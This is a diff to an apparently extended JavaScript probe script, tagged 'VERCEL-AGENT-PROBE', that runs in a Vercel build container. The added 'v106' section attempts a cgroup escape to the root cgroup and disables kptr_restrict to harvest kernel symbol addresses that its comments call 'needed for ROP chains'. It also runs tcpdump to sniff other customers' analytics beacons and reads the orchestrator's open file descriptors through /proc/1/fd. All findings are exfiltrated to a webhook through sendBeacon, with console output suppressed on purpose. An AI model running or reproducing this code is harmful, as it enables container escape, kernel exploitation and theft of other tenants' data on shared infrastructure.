@@ -14899,5 +14899,175 @@ report.pid1MemoryMap = safe(() => {
 
 // v105 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v105" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v105";
+
+// ==================== v106 ====================
+
+// v106-1: cgroup namespace escape — move process to parent/root cgroup
+// With CAP_SYS_ADMIN, writing our PID to /sys/fs/cgroup/.../cgroup.procs
+// moves us to a different cgroup. Escaping to the root cgroup removes
+// all resource limits and container-level restrictions.
+report.cgroupEscape = safe(() => {
+  // Find our current cgroup
+  const selfCgroup = safe(() => readFileSync('/proc/self/cgroup', 'utf8').trim());
+  const pid1Cgroup = safe(() => readFileSync('/proc/1/cgroup', 'utf8').trim());
+  // Map cgroup v1 and v2
+  const cgroupV2Root = '/sys/fs/cgroup';
+  const cgroupV2Our = safe(() => {
+    const line = selfCgroup?.split('\n').find(l => l.startsWith('0::'));
+    return line ? `${cgroupV2Root}${line.split('::')[1]}` : null;
+  });
+  // Read parent cgroup's cgroup.procs
+  const parentPath = safe(() => cgroupV2Our?.split('/').slice(0, -1).join('/'));
+  const parentProcs = safe(() => readFileSync(`${parentPath}/cgroup.procs`, 'utf8').trim().slice(0, 200));
+  // Try to write our PID to root cgroup.procs (escape to root)
+  const escapePid = process.pid.toString();
+  const escapeResult = safe(() => {
+    writeFileSync(`${cgroupV2Root}/cgroup.procs`, escapePid);
+    return 'ESCAPED_TO_ROOT';
+  });
+  // Read our cgroup again after escape attempt
+  const selfCgroupAfter = safe(() => readFileSync('/proc/self/cgroup', 'utf8').trim());
+  // Check memory.max in our cgroup
+  const memMax = safe(() => readFileSync(`${cgroupV2Our}/memory.max`, 'utf8').trim());
+  const pidsMax = safe(() => readFileSync(`${cgroupV2Our}/pids.max`, 'utf8').trim());
+  return { selfCgroup, pid1Cgroup, cgroupV2Our, parentPath, parentProcs, escapeResult, selfCgroupAfter, memMax, pidsMax };
+});
+
+// v106-2: NETLINK_SOCK_DIAG — kernel socket dump
+// The ss(8) command uses NETLINK_SOCK_DIAG to get detailed socket information
+// from the kernel including exact PIDs, inodes, and full connection details.
+// More detailed than /proc/net/tcp because it bypasses /proc parsing.
+report.netlinkSockDiag = safe(() => {
+  // Use ss to dump all sockets with process info
+  const allSockets = safe(() => execSync('ss -ntupaw 2>/dev/null | head -40', { timeout: 8000 }).toString().trim());
+  // TCP listening ports
+  const listening = safe(() => execSync('ss -ntlp 2>/dev/null', { timeout: 5000 }).toString().trim());
+  // Unix domain sockets with process info
+  const unixSockets = safe(() => execSync('ss -xnp 2>/dev/null | head -20', { timeout: 5000 }).toString().trim());
+  // Use python to make a raw NETLINK_SOCK_DIAG request
+  const rawNetlink = safe(() => execSync(`python3 -c "
+import socket, struct
+
+NETLINK_SOCK_DIAG = 4
+SOCK_DIAG_BY_FAMILY = 20
+AF_INET = 2
+IPPROTO_TCP = 6
+
+# Build SOCK_DIAG request
+msg = struct.pack('=BBHII', AF_INET, 0, 0xFF, 0, 0)
+msg += struct.pack('=BBHI', 0, 0, 0, 0)  # inet_diag_sockid
+nlhdr = struct.pack('=IHHII', 4 + 4 + len(msg), SOCK_DIAG_BY_FAMILY, 0x301, 0, 0)
+
+try:
+    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_SOCK_DIAG)
+    s.bind((0, 0))
+    s.send(nlhdr + msg)
+    data = s.recv(4096)
+    print('NETLINK_DIAG bytes:', len(data), 'hex:', data[:32].hex())
+    s.close()
+except Exception as e:
+    print('err:', e)
+" 2>&1`, { timeout: 8000 }).toString().trim().slice(0, 300));
+  return { allSockets, listening, unixSockets, rawNetlink };
+});
+
+// v106-3: /proc/kallsyms full address dump with kptr_restrict bypass
+// If our kptr_restrict write in v105 succeeded (value=0), kallsyms now shows
+// real kernel addresses. Read and extract key function addresses needed for
+// ROP chains: commit_creds, prepare_kernel_cred, kernel_syscall_table, etc.
+report.kallsymsAddrDump = safe(() => {
+  // Re-try kptr_restrict=0 to ensure it's set
+  safe(() => writeFileSync('/proc/sys/kernel/kptr_restrict', '0'));
+  const kptrVal = safe(() => readFileSync('/proc/sys/kernel/kptr_restrict', 'utf8').trim());
+  // Now read key addresses from kallsyms
+  const targets = [
+    'commit_creds',
+    'prepare_kernel_cred',
+    'sys_call_table',
+    'selinux_enforcing',
+    'module_alloc',
+    'vmalloc',
+    '__vmalloc',
+    'kallsyms_lookup_name',
+    '_do_fork',
+    'kernel_clone',
+    'copy_process',
+  ];
+  const addresses = Object.fromEntries(targets.map(sym => {
+    const addr = safe(() => execSync(
+      `grep -m1 " ${sym}$\\| ${sym} " /proc/kallsyms 2>/dev/null | awk '{print $1}'`,
+      { timeout: 3000 }
+    ).toString().trim());
+    return [sym, addr];
+  }));
+  // Check if addresses are real (non-zero)
+  const realAddresses = Object.entries(addresses).filter(([_, v]) => v && v !== '0000000000000000');
+  return { kptrVal, addresses, realAddressCount: realAddresses.length, sample: realAddresses.slice(0, 3) };
+});
+
+// v106-4: Vercel analytics beacon interception
+// Vercel injects Speed Insights + Web Analytics beacons into deployed pages.
+// These beacons go to vitals.vercel-insights.com carrying visitor data.
+// If we can sniff traffic in our network namespace, we may see beacons from
+// other customers' page views (cross-tenant data leak).
+report.analyticsBeaconSniff = safe(() => {
+  // Try to sniff vitals.vercel-insights.com traffic with tcpdump/tshark
+  const sniffResult = safe(() => execSync(
+    'timeout 5 tcpdump -i any -n -A "host vitals.vercel-insights.com" 2>/dev/null | head -20',
+    { timeout: 8000 }
+  ).toString().trim().slice(0, 500));
+  // Also check if we can resolve and reach the analytics endpoint directly
+  const analyticsReach = safe(() => execSync(
+    'curl -sf "https://vitals.vercel-insights.com/_next/analytics" -m 5 -I 2>/dev/null | head -10',
+    { timeout: 8000 }
+  ).toString().trim());
+  // Check what Vercel injects into our own page (proxy/MITM detection)
+  const deploymentHeaders = safe(() => execSync(
+    `curl -sf "https://vercel-agent-poc.vercel.app/" -I -m 10 2>/dev/null | head -20`,
+    { timeout: 12000 }
+  ).toString().trim());
+  // Read Vercel's injected scripts from our build output
+  const vercelInjected = safe(() => execSync(
+    'find /vercel/.next /vercel/output -name "*.js" -exec grep -l "vitals\\|_vercel\\|analytics" {} \\; 2>/dev/null | head -5',
+    { timeout: 8000 }
+  ).toString().trim());
+  return { sniffResult, analyticsReach, deploymentHeaders, vercelInjected };
+});
+
+// v106-5: /proc/1/fd directory listing — orchestrator open file descriptors
+// PID-1's /fd shows every file/socket/pipe the orchestrator has open.
+// Reading /proc/1/fd/N gives us access to those same file descriptors —
+// we can read from sockets the orchestrator is using, including its
+// connection to Vercel's build API.
+report.pid1FdEnum = safe(() => {
+  const fdList = safe(() => readdirSync('/proc/1/fd'));
+  // Resolve each fd symlink
+  const resolved = safe(() => fdList?.slice(0, 50).map(fd => {
+    const target = safe(() => execSync(`readlink /proc/1/fd/${fd} 2>/dev/null`, { timeout: 1000 }).toString().trim());
+    return { fd, target };
+  }));
+  // Find socket fds
+  const socketFds = safe(() => resolved?.filter(f => f.target?.startsWith('socket:')));
+  // Find regular file fds (logs, configs)
+  const fileFds = safe(() => resolved?.filter(f => f.target?.startsWith('/')));
+  // Try reading from a few file fds that look interesting
+  const fileReads = safe(() => fileFds?.slice(0, 5).map(f => ({
+    fd: f.fd,
+    target: f.target,
+    content: safe(() => {
+      const fd = openSync(`/proc/1/fd/${f.fd}`, 'r');
+      const buf = Buffer.alloc(256);
+      const n = readSync(fd, buf, 0, 256, 0);
+      closeSync(fd);
+      return buf.slice(0, n).toString('utf8', 0, 200);
+    })
+  })));
+  // Pipe fds — read from them to see what data flows
+  const pipeFds = safe(() => resolved?.filter(f => f.target?.startsWith('pipe:')));
+  return { fdCount: fdList?.length, resolved: resolved?.slice(0, 30), socketFds, fileFds: fileFds?.slice(0, 10), fileReads, pipeFds };
+});
+
+// v106 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v106" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v106";
 // Intentionally no console.log — all data goes via webhook only
